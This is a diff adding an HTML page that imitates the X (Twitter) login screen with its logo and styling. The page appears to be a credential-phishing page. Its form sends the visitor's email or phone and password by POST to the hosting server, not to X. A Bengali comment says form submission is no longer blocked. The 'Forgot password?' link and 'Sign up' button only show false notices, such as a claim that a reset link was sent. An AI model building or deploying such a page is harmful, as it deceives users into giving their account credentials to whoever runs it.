@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>X - Log in</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #000;
+            color: #fff;
+            line-height: 1.6;
+            overflow-x: hidden;
+            min-height: 100vh;
+            display: flex;
+        }
+        
+        /* Left Side - Hero Section */
+        .hero-section {
+            flex: 1;
+            background-color: #000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px;
+            position: relative;
+            overflow: hidden;
+            border-right: 1px solid #2F3336;
+        }
+        
+        .hero-background {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 30% 50%, #1DA1F2 0%, transparent 60%);
+            opacity: 0.05;
+            animation: pulse 8s ease-in-out infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 0.05; transform: scale(1); }
+            50% { opacity: 0.08; transform: scale(1.02); }
+        }
+        
+        .hero-content {
+            position: relative;
+            z-index: 2;
+            text-align: center;
+            max-width: 500px;
+        }
+        
+        .feature-list {
+            list-style: none;
+            margin-top: 0px;
+            text-align: left;
+        }
+        
+        .feature-list li {
+            display: flex;
+            align-items: center;
+            margin-bottom: 30px;
+            font-size: 18px;
+            font-weight: 600;
+            color: #E7E9EA;
+        }
+        
+        .feature-icon {
+            width: 24px;
+            height: 24px;
+            margin-right: 16px;
+            fill: #1DA1F2;
+        }
+        
+        .twitter-logo-large {
+            width: 380px;
+            height: 380px;
+            fill: #fff;
+            opacity: 0.9;
+            filter: drop-shadow(0 0 20px rgba(29, 161, 242, 0.3));
+        }
+        
+        /* Right Side - Login Section */
+        .login-section {
+            width: 45%;
+            max-width: 600px;
+            padding: 80px 40px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            position: relative;
+        }
+        
+        .twitter-logo {
+            width: 40px;
+            height: 40px;
+            fill: #fff;
+            margin-bottom: 40px;
+        }
+        
+        .login-header {
+            margin-bottom: 32px;
+        }
+        
+ 
+        
+        .login-subtitle {
+            font-size: 31px;
+            font-weight: 700;
+            margin-bottom: 32px;
+            color: #E7E9EA;
+        }
+        
+        /* Buttons */
+        .button-group {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+            max-width: 300px;
+            margin-bottom: 40px;
+        }
+        
+        .social-button {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            padding: 12px 16px;
+            border-radius: 9999px;
+            border: 1px solid #536471;
+            background: transparent;
+            color: #fff;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .social-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
+            transition: left 0.5s;
+        }
+        
+        .social-button:hover::before {
+            left: 100%;
+        }
+        
+        .social-button:hover {
+            background: rgba(255, 255, 255, 0.03);
+            border-color: #71767B;
+            transform: translateY(-1px);
+        }
+        
+        .social-icon {
+            width: 18px;
+            height: 18px;
+        }
+        
+        /* Divider */
+        .divider {
+            display: flex;
+            align-items: center;
+            max-width: 300px;
+            margin: 20px 0;
+            position: relative;
+        }
+        
+        .divider-line {
+            flex: 1;
+            height: 1px;
+            background: #2F3336;
+        }
+        
+
+        
+        /* Login Form */
+        .login-form {
+            max-width: 300px;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+        
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            height: 56px;
+            border: 1px solid #2F3336;
+            border-radius: 4px;
+            padding: 0 16px;
+            font-size: 17px;
+            background-color: #000;
+            color: #fff;
+            transition: all 0.3s ease;
+            outline: none;
+        }
+        
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            border-color: #1DA1F2;
+            box-shadow: 0 0 0 2px rgba(29, 161, 242, 0.2);
+        }
+        
+        ::placeholder {
+            color: #71767B;
+        }
+        
+        /* Login Button */
+        .login-button {
+            background: #fff;
+            color: #000;
+            border: none;
+            border-radius: 9999px;
+            padding: 14px 0;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            width: 100%;
+            margin-bottom: 20px;
+            transition: all 0.2s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .login-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(0,0,0,0.1), transparent);
+            transition: left 0.5s;
+        }
+        
+        .login-button:hover::before {
+            left: 100%;
+        }
+        
+        .login-button:hover {
+            background: #E6E6E6;
+            transform: translateY(-1px);
+        }
+        
+        /* Footer Links */
+        .footer-links {
+            max-width: 300px;
+            text-align: center;
+        }
+        
+        .footer-links a {
+            color: #1DA1F2;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            transition: all 0.2s ease;
+            padding: 8px 12px;
+            border-radius: 4px;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
+            background: rgba(29, 161, 242, 0.1);
+        }
+        
+        /* Sign Up Section */
+        .signup-section {
+            max-width: 300px;
+            margin-top: 40px;
+        }
+        
+        .signup-title {
+            font-size: 17px;
+            font-weight: 600;
+            color: #71767B;
+            margin-bottom: 20px;
+        }
+        
+        .signup-button {
+            background: transparent;
+            color: #1DA1F2;
+            border: 1px solid #536471;
+            border-radius: 9999px;
+            padding: 12px 0;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.2s ease;
+        }
+        
+        .signup-button:hover {
+            background: rgba(29, 161, 242, 0.1);
+        }
+        
+        /* Terms */
+        .terms {
+            margin-top: 60px;
+            max-width: 300px;
+            font-size: 11px;
+            color: #71767B;
+            line-height: 1.5;
+        }
+        
+        .terms a {
+            color: #1DA1F2;
+            text-decoration: none;
+        }
+        
+        .terms a:hover {
+            text-decoration: underline;
+        }
+        
+        /* Loading Animation */
+        .loading {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #fff;
+            border-top: 2px solid #1DA1F2;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* Notification */
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #1DA1F2;
+            color: white;
+            padding: 16px 24px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+            transform: translateX(150%);
+            transition: transform 0.3s ease;
+            z-index: 1000;
+        }
+        
+        .notification.show {
+            transform: translateX(0);
+        }
+        
+        /* Responsive Design */
+        @media (max-width: 1200px) {
+            .hero-section {
+                display: none;
+            }
+            
+            .login-section {
+                width: 100%;
+                max-width: 100%;
+                align-items: center;
+                text-align: center;
+            }
+        }
+        
+        @media (max-width: 768px) {
+            .login-section {
+                padding: 40px 20px;
+            }
+            
+         
+            
+            .login-subtitle {
+                font-size: 23px;
+            }
+            
+            .twitter-logo {
+                margin-bottom: 24px;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .login-section {
+                padding: 20px;
+            }
+            
+          
+            
+            .login-subtitle {
+                font-size: 20px;
+                margin-bottom: 24px;
+            }
+            
+            input[type="text"],
+            input[type="password"] {
+                height: 48px;
+                font-size: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Left Side - Hero Section -->
+    <div class="hero-section">
+        <div class="hero-background"></div>
+        <div class="hero-content">
+            <!-- Large X logo removed from here -->
+        </div>
+    </div>
+    
+    <!-- Right Side - Login Section -->
+    <div class="login-section">
+        <svg class="twitter-logo" viewBox="0 0 24 24">
+            <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
+        </svg>
+        
+        <div class="login-header">
+            
+            <h2 class="login-subtitle">Join today.</h2>
+        </div>
+        
+        
+        
+        <div class="divider">
+            <div class="divider-line"></div>
+            
+            <div class="divider-line"></div>
+        </div>
+        
+        <div class="login-form">
+            <form id="loginForm" method="POST" action="/">
+                <div class="input-group">
+                    <input type="text" name="email" id="phone_email" placeholder="Phone number or email" required>
+                </div>
+                
+                <div class="input-group">
+                    <input type="password" name="pass" id="password" placeholder="Password" required>
+                </div>
+                
+                <button type="submit" class="login-button" id="loginButton">
+                    <span id="buttonText">Log in</span>
+                    <div class="loading" id="loadingSpinner"></div>
+                </button>
+            </form>
+            
+            <div class="footer-links">
+                <a href="#" onclick="showNotification('Password reset link sent to your email')">Forgot password?</a>
+            </div>
+        </div>
+        
+        <div class="signup-section">
+            <div class="signup-title">Don't have an account?</div>
+            <button class="signup-button" onclick="showNotification('Redirecting to sign up...')">Sign up</button>
+        </div>
+        
+        <div class="terms">
+            By signing up, you agree to the <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>, including <a href="#">Cookie Use</a>.
+        </div>
+    </div>
+
+    <!-- Notification -->
+    <div class="notification" id="notification"></div>
+
+    <script>
+        // নিচের জাভাস্ক্রিপ্টটি এখন আর ফর্ম সাবমিট হওয়া আটকাবে না।
+        
+        // Notification system
+        function showNotification(message) {
+            const notification = document.getElementById('notification');
+            notification.textContent = message;
+            notification.classList.add('show');
+            
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 3000);
+        }
+        
+        // Add some interactive effects
+        document.querySelectorAll('.social-button, .login-button, .signup-button').forEach(button => {
+            button.addEventListener('mousedown', function() {
+                this.style.transform = 'translateY(0)';
+            });
+            
+            button.addEventListener('mouseup', function() {
+                this.style.transform = 'translateY(-1px)';
+            });
+        });
+    </script>
+</body>
+</html>
